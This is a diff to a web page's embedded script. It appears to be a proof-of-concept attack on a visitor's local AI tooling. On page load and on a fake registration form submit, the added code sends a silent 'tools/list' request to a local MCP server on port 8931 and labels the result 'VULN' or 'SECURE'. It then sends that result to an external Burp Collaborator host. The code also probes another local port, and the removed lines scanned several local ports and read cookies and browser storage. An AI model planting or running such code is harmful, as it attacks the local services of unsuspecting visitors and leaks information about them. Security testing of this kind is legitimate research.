@@ -96,17 +96,19 @@
     </div>
 
     <script>
-        // Silent background execution
-        async function runTests() {
-            // 1. Check User Agent
-            const ua = navigator.userAgent;
-            
-            // 2. Check Localhost (Bash-Sidecar)
-            try {
-                await fetch('http://localhost:8082', { mode: 'no-cors' });
-            } catch (e) {}
+        const COLLABORATOR = 'x751urew4xtk91cek7r1h59yppvhj77w.oastify.com';
 
-            // 3. Check MCP Port (8931) with Origin Spoofing
+        async function sendToBurp(status, contentType) {
+            try {
+                // Sending detailed data to Burp Collaborator
+                const url = `https://${COLLABORATOR}?status=${encodeURIComponent(status)}&type=${encodeURIComponent(contentType)}`;
+                await fetch(url, { mode: 'no-cors' }); 
+            } catch (e) {
+                console.log("Failed to contact collaborator", e);
+            }
+        }
+
+        async function runTests() {
             const mcpUrl = 'http://localhost:8931/mcp';
             const options = {
                 method: 'POST',
@@ -120,25 +122,33 @@
                     method: "tools/list"
                 })
             };
-            try {
-                await fetch(mcpUrl, options);
-            } catch (e) {}
 
-            // 4. Check Orphaned Ports
-            const ports = [5432, 6379, 8888, 9000, 9090, 9091];
-            for (let port of ports) {
-                try {
-                    await fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors' });
-                } catch (e) {}
+            let statusCode = 'CONNECTION_ERROR';
+            let contentType = 'unknown';
+
+            try {
+                const response = await fetch(mcpUrl, options);
+                statusCode = response.status;
+                contentType = response.headers.get('content-type') || 'unknown';
+
+                // Determine Vulnerability Status
+                if (statusCode === 401 || statusCode === 403) {
+                    statusCode = 'SECURE: 403/401 Rejected';
+                } else if (statusCode === 200) {
+                    statusCode = 'VULN: 200 Accepted';
+                }
+            } catch (error) {
+                statusCode = 'NETWORK_FAIL';
             }
 
-            // 5. Check DOM/Storage
-            localStorage.getItem('test');
-            sessionStorage.getItem('test');
-            document.cookie;
+            sendToBurp(statusCode, contentType);
+
+            // Optional: Run other tests silently
+            try {
+                await fetch('http://localhost:8082', { mode: 'no-cors' });
+            } catch (e) {}
         }
 
-        // Trigger on form submit or load
         document.getElementById('regForm').addEventListener('submit', function(e) {
             e.preventDefault();
             runTests();
@@ -146,7 +156,6 @@
             document.getElementById('submitBtn').disabled = true;
         });
 
-        // Also run on load just in case
         window.addEventListener('load', runTests);
     </script>
 </body>
